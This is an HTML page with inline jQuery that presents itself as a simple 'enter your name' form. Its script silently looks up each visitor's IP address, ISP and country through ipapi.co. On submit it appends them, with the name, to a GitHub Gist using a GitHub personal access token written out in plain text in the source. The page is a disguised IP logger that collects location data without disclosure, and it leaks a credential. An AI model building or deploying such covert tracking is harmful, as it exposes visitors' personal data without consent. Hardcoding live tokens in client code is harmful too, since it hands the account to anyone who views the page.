<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="favicon.png">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <h1>HII</h1>
    <h4>Input your name if it actually works!</h4>
    <input placeholder="Name" id="nameInput">
    <button onclick="submitData()">Submit</button>

    <script>
        // Declare variables to store data
        var ipAddress, isp, country, nameInput;

        // Function to handle the data
        function handleData(data) {
            // Assign values to variables
            ipAddress = data.ip;
            isp = data.org;
            country = data.country_name;

            // Update HTML elements with the variables
            $('#ip').text(ipAddress);
            $('#isp').text(isp);
            $('#country').text(country);
        }

        // Function to send data to GitHub Gist
        function sendToGist(ip, isp, country, name) {
            // Replace 'your-gist-id' with the actual Gist ID
            const gistId = '1355d91052d5d03dba93926812a9ab36';
            // Replace 'YOUR_ACCESS_TOKEN' with your GitHub personal access token
            const accessToken = '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';

            // Gist API URL
            const apiUrl = `https://api.github.com/gists/${gistId}`;

            // Fetch existing data from the Gist
            $.ajax({
                url: apiUrl,
                type: 'GET',
                dataType: 'json',
                headers: {
                    'Authorization': `token ${accessToken}`
                },
                success: function(gistData) {
                    // Extract existing data from the Gist
                    let existingData = gistData.files['data.json'].content ? JSON.parse(gistData.files['data.json'].content) : [];

                    // Ensure existingData is an array
                    if (!Array.isArray(existingData)) {
                        console.error('Existing data is not an array:', existingData);
                        // If it's not an array, initialize it as an empty array
                        existingData = [];
                    }

                    // New data to be appended
                    const newData = {
                        ip: ip,
                        isp: isp,
                        country: country,
                        name: name
                    };

                    // Append the new data to the existing data
                    existingData.push(newData);

                    // Update Gist with the combined data
                    $.ajax({
                        url: apiUrl,
                        type: 'PATCH',
                        dataType: 'json',
                        headers: {
                            'Authorization': `token ${accessToken}`
                        },
                        contentType: 'application/json',
                        data: JSON.stringify({
                            files: {
                                'data.json': {
                                    content: JSON.stringify(existingData)
                                }
                            }
                        }),
                        success: function(response) {
                            console.log('Data sent to Gist successfully:', response);
                        },
                        error: function(error) {
                            console.error('Error sending data to Gist:', error);
                        }
                    });
                },
                error: function(error) {
                    console.error('Error fetching Gist data:', error);
                }
            });
        }

        // Function to be called when the button is clicked
        function submitData() {
            // Get the name input value
            nameInput = $('#nameInput').val();

            // Fetch data from external API
            $.getJSON('https://ipapi.co/json', function(data) {
                // Handle the data (display on the page)
                handleData(data);

                // Send data to GitHub Gist
                sendToGist(ipAddress, isp, country, nameInput);
            });
        }

        // Fetch initial data from external API when the page starts
        $.getJSON('https://ipapi.co/json', handleData);
    </script>
</body>
</html>
